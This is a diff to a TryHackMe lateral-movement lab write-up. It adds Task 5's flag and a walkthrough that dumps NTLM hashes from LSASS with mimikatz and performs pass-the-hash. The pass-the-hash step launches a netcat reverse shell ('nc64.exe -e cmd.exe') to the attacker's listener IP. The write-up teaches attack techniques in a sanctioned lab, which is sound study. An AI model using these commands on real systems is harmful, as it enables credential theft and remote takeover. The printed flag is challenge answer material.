@@ -823,7 +823,7 @@ You'll find a flag on t1_toby.beck's desktop on THMIIS. Both `mimikatz` and `pse
 
 * What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on THMIIS?
 
-    ``
+    `THM{NO_PASSWORD_NEEDED}`
 
     * Login SSH to THMJMP2
     
@@ -831,7 +831,51 @@ You'll find a flag on t1_toby.beck's desktop on THMIIS. Both `mimikatz` and `pse
         ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
         ```
 
+    * Run mimikatz on `C:\tools`
+    
+        ![task5-mimikatz](./images/task5-mimikatz.png)
+
+    * Extracting NTLM hashes from LSASS memory
         
+        ```
+        privilege::debug
+        token::elevate
+        ```
+
+        ![task5-debug](./images/task5-debug.png)
+
+    * Dump NTLM Hashes
+    
+        ```
+        sekurlsa::msv
+        ```
+
+        ![task5-hash](./images/task5-hash.png)
+
+    * Setup listerner
+    
+        ```
+        nc -nlvp 5555
+        ```
+
+    * Use the extracted hashes to perform a PtH attack
+    
+        ```
+        token::revert
+
+        sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe 10.50.46.109 5555"
+        ```
+
+        ![task5-PtH](./images/task5-PtH.png)
+
+    * Get the shell and flag on THMIIS desktop user
+    
+
+        ```
+        winrs.exe -r:THMIIS.za.tryhackme.com cmd
+        ```
+
+        ![task5-flag](./images/task5-flag.png)
 
 ## Task 6 - Abusing User Behaviour
 
